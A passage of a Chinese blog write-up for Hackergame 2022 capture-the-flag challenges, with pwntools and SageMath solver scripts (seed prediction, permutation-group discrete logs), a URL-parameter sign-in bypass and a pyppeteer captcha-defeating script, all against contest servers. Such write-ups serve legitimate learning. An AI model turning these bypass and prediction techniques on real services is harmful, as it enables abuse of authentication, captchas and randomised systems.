class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), guess[<span class=\"number\">4</span>].encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), guess[<span class=\"number\">5</span>].encode())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recvlines(<span class=\"number\">3</span>))</span><br></pre></td></tr></table></figure>\n\n<p>其中 <code>setseed.c</code> 代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">double</span> <span class=\"title function_\">rand01</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">double</span>)rand() / RAND_MAX;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// let main receive a seed</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// disable buffering</span></span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stderr</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> seed = <span class=\"number\">1666610168</span>+<span class=\"number\">946</span>;</span><br><span class=\"line\">    seed = atoi(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%u\\n&quot;</span>,seed);</span><br><span class=\"line\">    srand(seed<span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> games = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> win = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> lose = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> target[<span class=\"number\">20</span>];</span><br><span class=\"line\">    <span class=\"type\">char</span> guess[<span class=\"number\">2000</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = games; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> M = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> N = <span class=\"number\">400000</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; N; j++) &#123;</span><br><span class=\"line\">            <span class=\"type\">double</span> x = rand01();</span><br><span class=\"line\">            <span class=\"type\">double</span> y = rand01();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (x*x + y*y &lt; <span class=\"number\">1</span>) M++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">double</span> pi = (<span class=\"type\">double</span>)M / N * <span class=\"number\">4</span>;</span><br><span class=\"line\">        <span class=\"built_in\">sprintf</span>(target, <span class=\"string\">&quot;%1.5f&quot;</span>, pi);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%1.5f\\n&quot;</span>, pi);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"置换魔群\"><a href=\"#置换魔群\" class=\"headerlink\" title=\"置换魔群\"></a>置换魔群</h2><p>打通了，还行。<br>置换群的概念题目已经说得很清楚了，这里不再赘述。<br>Level1 是生成一个置换群 $A_n$ ，并给出 $x^e$ 和 $e=66537$ ，求群 $A_n$ 的元素 $x$ 。<br>那么这就很类似 RSA 了，首先 RSA 的解密原理是，对于模 $n$ 群，对其中的<strong>任意元素</strong> $x$ ，都有 $x^{\\varphi(n)}\\equiv1\\mod n$ ，这里的$\\varphi(n)$称为<strong>群的阶</strong>。所以 $m^{ed}\\equiv m^{k\\varphi(n)+1}\\equiv (m^{\\varphi})^km\\equiv m\\mod n$ 。（srds，这竟然是我在做这道题的时候推公式想明白的）<br>那么回到这个题就很简单了，只需求出 $A_n$ 的阶，然后取 $e$ 模 $A_n$ 阶的逆元就能得到解密指数 $d$ 了。<br>题目给了简陋的求群的阶的函数，但速度比较慢，用 sagemath 实现了一下，快了很多。<br>关键代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">n, c, e=<span class=\"number\">65537</span></span>):</span><br><span class=\"line\">    S = SymmetricGroup(n)</span><br><span class=\"line\">    d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, S.order())</span><br><span class=\"line\">    res = S(c) ** <span class=\"built_in\">int</span>(d)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span>(<span class=\"built_in\">list</span>(res.<span class=\"built_in\">tuple</span>()))   <span class=\"comment\"># 这里应该有更优雅的写法</span></span><br></pre></td></tr></table></figure>\n\n<p>Level2 同样生成一个置换群 $A_n$ ，给出一个元素 $g$ 和 $g^y$ ，要求 $y$ 。<br>那么这就是一个离散对数问题了，用 sagemath 的 <code>discrete_log</code> 函数就能解决。<br>当然如果你和我一样不知道 sagemath 的置换群用的哪个函数，可以使用万能的 copilot 直接先敲一行注释，然后回车按 <code>tab</code> 。<br>关键代码如下：（只有两行，乐）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">g, y, n</span>):</span><br><span class=\"line\">    S = SymmetricGroup(n)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> discrete_log(S(y), S(g))</span><br></pre></td></tr></table></figure>\n\n<p>Level3 同样是离散对数问题，允许输入两个元素 $g_1$ 和 $g_2$ ，然后给出 $g_1^m$ 和 $g_2^m$ ，要求 $m$ 。<br>上面提到了<strong>群的阶</strong>，这里引入<strong>元素的阶</strong>的概念：比如模 $5$ 的群中，群的阶为 $\\varphi(5)=4$ ，也就是说 $1^4\\equiv2^4\\equiv3^4\\equiv4^4\\mod 5$ ，但是我们发现， $1^1 \\mod1$ 就已经是 $1$ 了， $4^2\\mod 5$ 也一样不需要达到 $4$ 次方就到 $1$ ，这里我们称<strong>最小的</strong> $k$ 使元素 $x$ 满足 $x^k\\equiv1\\mod n$ 为<strong>元素 $x$ 的阶</strong>，也就是说如上的例子中 $1$ 的阶为 $1$ ， $4$ 的阶为 $2$ 。<br>现在回到题目，我们发现难点在于要求的 $m$ 是比较大的，记 $g_1$ 和 $g_2$ 的阶分别为 $a$ 和 $b$ ，容易知道我们求离散对数得到的只是 $m_1\\equiv m\\mod a$ 和 $m_2\\equiv m\\mod b$ ，由中国剩余定理可知最后求出的 $m’\\equiv m\\mod \\mathrm{lcm}(a,b)$ ，也就是说，我们构造的 $g_1$ 和 $g_2$ 的阶的<strong>最小公倍数需要足够大</strong>才能得到 $m$ 。</p>\n<p>然后不难搜得求置换群元素的阶最大的问题可以转化成求一组数的和不超过 $n$ ，如果使这组数的最小公倍数最大的问题。显然这组数应该是互质的，但<strong>这并不意味着这组数要全为质数</strong>！比如 $n=7$ 时，我们可以得到 $3\\times4$ 是最大的， $3$ 和 $4$ 互质，但 $4$ 不是质数。如此我们可以手推几个，然后在数列网站 OEIS 上搜索得到数列<a href=\"https://oeis.org/A000793\">A000793</a>，关于这个数列的介绍为 <code>Landau&#39;s function g(n): largest order of permutation of n elements. Equivalently, largest LCM of partitions of n.</code><br>显然这正是我们要找的，于是复制下面给出的代码就可以生成 $g_1$ 了，而对于 $g_2$ ，我的做法是拿到 $g_2$ 中最大数后面的素数列填充进去，若不能继续填充且空间还有剩余，则使最后两个素数<strong>尽可能大且尽可能相近</strong>。<br>最后我的蹩脚算法得出来的界大部分比题目的界要大，有小部分小 $1/10$ 左右，基本上都能大过 $m$ 。</p>\n<p>贴一下完整的垃圾代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> sympy <span class=\"keyword\">import</span> primerange, prevprime</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;202.38.93 .111&quot;</span>, <span class=\"number\">10114</span>)</span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\">token = &lt;your_token&gt;</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&quot;token: &quot;</span>, token.encode())</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&quot;&gt; your choice: &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">n2perm</span>(<span class=\"params\">l</span>):</span><br><span class=\"line\">    ll = []</span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">        ll.append(<span class=\"built_in\">tuple</span>(<span class=\"built_in\">range</span>(i, i+x)))</span><br><span class=\"line\">        i += x</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ll</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">aupton</span>(<span class=\"params\">N</span>):  <span class=\"comment\"># compute terms a(0)..a(N)</span></span><br><span class=\"line\">    V = [<span class=\"number\">1</span> <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N+<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> primerange(<span class=\"number\">2</span>, N+<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N, i-<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">            hi = V[j]</span><br><span class=\"line\">            pp = i</span><br><span class=\"line\">            <span class=\"keyword\">while</span> pp &lt;= j:</span><br><span class=\"line\">                hi = <span class=\"built_in\">max</span>((pp <span class=\"keyword\">if</span> j == pp <span class=\"keyword\">else</span> V[j-pp]*pp), hi)</span><br><span class=\"line\">                pp *= i</span><br><span class=\"line\">            V[j] = hi</span><br><span class=\"line\">    <span class=\"keyword\">return</span> V</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_fac</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    prod = data[n - <span class=\"number\">1</span>]</span><br><span class=\"line\">    f = factor(prod)</span><br><span class=\"line\">    f_ = <span class=\"built_in\">str</span>(f).split(<span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">    fl = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> f_:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;^&#x27;</span> <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            fl.append(<span class=\"built_in\">eval</span>(i.replace(<span class=\"string\">&#x27;^&#x27;</span>, <span class=\"string\">&#x27;**&#x27;</span>)))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            fl.append(<span class=\"built_in\">int</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fl</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_fac2</span>(<span class=\"params\">n, fl1_prod</span>):</span><br><span class=\"line\">    fl2 = []</span><br><span class=\"line\">    i = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">sum</span>(fl2) &lt; n:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> gcd(i, fl1_prod) == <span class=\"number\">1</span>:</span><br><span class=\"line\">            fl2.append(i)</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">sum</span>(fl2) &gt; n:</span><br><span class=\"line\">        fl2.pop()</span><br><span class=\"line\">        fl2.pop()</span><br><span class=\"line\">        fl2.append(prevprime(n - <span class=\"built_in\">sum</span>(fl2)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fl2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_n2l</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    l1 = get_fac(n)</span><br><span class=\"line\">    l2 = get_fac2(n, prod(l1))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n2perm(l1), n2perm(l2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_n</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;[+] DH public key: n = &#x27;</span>)</span><br><span class=\"line\">    n = <span class=\"built_in\">int</span>(p.recvline()[:-<span class=\"number\">1</span>].decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_bound</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;[+] The upper bound for my private key is &#x27;</span>)</span><br><span class=\"line\">    bound = <span class=\"built_in\">int</span>(p.recvline()[:-<span class=\"number\">1</span>].decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> bound</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_pub</span>(<span class=\"params\">g</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;(a list): &#x27;</span>,g.encode())</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27; : &#x27;</span>)</span><br><span class=\"line\">    y = <span class=\"built_in\">eval</span>(p.recvline()[:-<span class=\"number\">1</span>].decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">    n = get_n()</span><br><span class=\"line\">    bound = get_bound()</span><br><span class=\"line\">    info(<span class=\"string\">f&quot;    n = <span class=\"subst\">&#123;n&#125;</span>&quot;</span>)</span><br><span class=\"line\">    info(<span class=\"string\">f&quot;bound = <span class=\"subst\">&#123;bound&#125;</span>&quot;</span>)</span><br><span class=\"line\">    S = SymmetricGroup(n)</span><br><span class=\"line\">    data = aupton(<span class=\"number\">2000</span>)</span><br><span class=\"line\">    g,g_ = get_n2l(n)</span><br><span class=\"line\">    g1, g2 = S(g), S(g_)</span><br><span class=\"line\">    opt = lcm(g1.order(), g2.order())</span><br><span class=\"line\">    info(<span class=\"string\">f&quot;  opt = <span class=\"subst\">&#123;opt&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> opt &lt; bound:</span><br><span class=\"line\">        warning(<span class=\"string\">&quot;opt &lt; bound&quot;</span>)</span><br><span class=\"line\">    pub1 = get_pub(<span class=\"built_in\">str</span>(<span class=\"built_in\">list</span>(g1.<span class=\"built_in\">tuple</span>())))</span><br><span class=\"line\">    pub2 = get_pub(<span class=\"built_in\">str</span>(<span class=\"built_in\">list</span>(g2.<span class=\"built_in\">tuple</span>())))</span><br><span class=\"line\">    pub1, pub2 = S(pub1), S(pub2)</span><br><span class=\"line\">    m1, m2 = discrete_log(pub1,g1), discrete_log(pub2,g2)</span><br><span class=\"line\">    <span class=\"comment\"># success(f&quot;m1 = &#123;m1&#125;\\nm2 = &#123;m2&#125;&quot;)</span></span><br><span class=\"line\">    m = crt([m1,m2],[g1.order(),g2.order()])</span><br><span class=\"line\">    success(<span class=\"string\">f&quot;    m = <span class=\"subst\">&#123;m&#125;</span>&quot;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; your answer: &#x27;</span>, <span class=\"built_in\">str</span>(m).encode())</span><br><span class=\"line\">    res = p.recvline().decode()</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> res == <span class=\"string\">&#x27;Good job\\n&#x27;</span>, res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recvline().decode())</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"矩阵之困（未解出）\"><a href=\"#矩阵之困（未解出）\" class=\"headerlink\" title=\"矩阵之困（未解出）\"></a>矩阵之困（未解出）</h2><p>开赛做完签到后看的第一题，结果最后也成为本场比赛最难的 1 解题（表面看起来是 2 解，但其实两个号都是 mcfx），不得不说我眼光真好（）<br>查到三向量内积可表示成 $a^TBc$ ，其中 $B$ 的对角线为 $b$ ，但似乎没什么用。<br>用 z3 梭了几天出不来，放弃。</p>\n<h2 id=\"片上系统（未解出）\"><a href=\"#片上系统（未解出）\" class=\"headerlink\" title=\"片上系统（未解出）\"></a>片上系统（未解出）</h2><p>发现 pulseview 还挺有意思。</p>\n<h2 id=\"量子藏宝图\"><a href=\"#量子藏宝图\" class=\"headerlink\" title=\"量子藏宝图\"></a>量子藏宝图</h2><p>挺有意思的，一直只研究后量子密码学，却没看过量子密码，正好补充知识。</p>\n<h2 id=\"企鹅拼盘\"><a href=\"#企鹅拼盘\" class=\"headerlink\" title=\"企鹅拼盘\"></a>企鹅拼盘</h2><p>Level1 手试即可，结果为 <code>1000</code> 。</p>\n<h2 id=\"火眼金睛的小E\"><a href=\"#火眼金睛的小E\" class=\"headerlink\" title=\"火眼金睛的小E\"></a>火眼金睛的小E</h2><p>Level1 直接装个 bindiff 人工比对，但是正确率不太高，需要多试几次，有时甚至 bindiff 连函数都没检测出来。。。</p>\n","excerpt":"<p>好玩，爆赞！</p>","more":"<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>不知不觉，离上一年 Hackergame 都一年了 <del>（有点像废话）</del>，作为我CTF的启蒙赛， Hackergame 2021 拿分最多的其实还是靠 web ，如今我却出乎意料地成为了队里的密码手。<br>今年已经不像上年那么有空，前面的搜索题都没空做。总体来说，虽然做不出来，但好歹也能将大部分题目阅读一遍了。<del>（有进步，但不多）</del><br>没好意思填学校的组，直接在公开组注册，最终得分 2850 ，总排名 145 ，也就只有 math 榜上能看见我了。<br>GZTime 还是如同上年一样直线上分，但意想不到的是 mcfx 也被一个不明来路的直线上分的老六偷了榜一。<br>这里记录一下解出的题的题解，对解不出但尝试过的，也作一些记录，多少从中学到了一些东西。<br>最近要期中考，断断续续更这里吧。</p>\n<hr>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>点开网页，发现是一个手写签名，四个框内，依次要在 2 秒，1 秒，0.1 秒，0.0 秒内分别写下 <code>2022</code> 才能通过。<br>首先直接靠手速必然是不行的，因为第四个框最多只能留下一个点，于是尝试点了个提交，发现顶上的 url 多了个 <code>?result=????</code>，果然还是和上年一样的套路，四个问号改成 2022 ，回车，得到 flag 。</p>\n<h2 id=\"猫咪问答喵\"><a href=\"#猫咪问答喵\" class=\"headerlink\" title=\"猫咪问答喵\"></a>猫咪问答喵</h2><p>第一问直接搜就有，第二问没找到，第三问也直接搜，第四问没找，第六问爆破出来的（）<br>第五问也没找出来，但是找到一个网站叫 <a href=\"https://search.censys.io/data\">Censys.io</a> ，似乎可以搜索 ssh 的 sha256 指纹查 host ，以及有关一堆乱七八糟的查询，不知道以后能不能用得上。</p>\n<h2 id=\"家目录里的秘密\"><a href=\"#家目录里的秘密\" class=\"headerlink\" title=\"家目录里的秘密\"></a>家目录里的秘密</h2><p>Level1 直接搜目录内文件就有。<br>Level2 没下 Rclone ，以为要找到那个 <code>rclone.config</code> 文件里的真实域名再ftp进去。。。</p>\n<h2 id=\"HeiLang\"><a href=\"#HeiLang\" class=\"headerlink\" title=\"HeiLang\"></a>HeiLang</h2><p><code>Ctrl</code> + <code>H</code>，将 <code>|</code> 全部替换成 <code>]=a[</code> 即可。</p>\n<h2 id=\"Xcaptcha\"><a href=\"#Xcaptcha\" class=\"headerlink\" title=\"Xcaptcha\"></a>Xcaptcha</h2><p>用 <code>pyppeteer</code> 干了，简单粗暴。<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyppeteer <span class=\"keyword\">import</span> launch</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    browser = <span class=\"keyword\">await</span> launch(&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;executablePath&#x27;</span>: <span class=\"string\">r&#x27;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;headless&#x27;</span>: <span class=\"literal\">False</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;args&#x27;</span>: [<span class=\"string\">&#x27;--no-sandbox&#x27;</span>, <span class=\"string\">&#x27;--window-size=1366,850&#x27;</span>]</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    page = <span class=\"keyword\">await</span> browser.newPage()</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.setViewport(&#123;<span class=\"string\">&#x27;width&#x27;</span>:<span class=\"number\">1366</span>,<span class=\"string\">&#x27;height&#x27;</span>:<span class=\"number\">768</span>&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.goto(<span class=\"string\">&#x27;http://202.38.93.111:10047/?token=&lt;your_token&gt;&#x27;</span>) </span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.click(<span class=\"string\">&#x27;.img-fluid&#x27;</span>)</span><br><span class=\"line\">    captcha1 = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;label[for=&quot;captcha1&quot;]&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    captcha2 = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;label[for=&quot;captcha2&quot;]&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    captcha3 = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;label[for=&quot;captcha3&quot;]&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    res1=<span class=\"built_in\">eval</span>(captcha1[:-<span class=\"number\">5</span>])</span><br><span class=\"line\">    res2=<span class=\"built_in\">eval</span>(captcha2[:-<span class=\"number\">5</span>])</span><br><span class=\"line\">    res3=<span class=\"built_in\">eval</span>(captcha3[:-<span class=\"number\">5</span>])</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"built_in\">type</span>(<span class=\"string\">&#x27;#captcha1&#x27;</span>, <span class=\"built_in\">str</span>(res1))</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"built_in\">type</span>(<span class=\"string\">&#x27;#captcha2&#x27;</span>, <span class=\"built_in\">str</span>(res2))</span><br><span 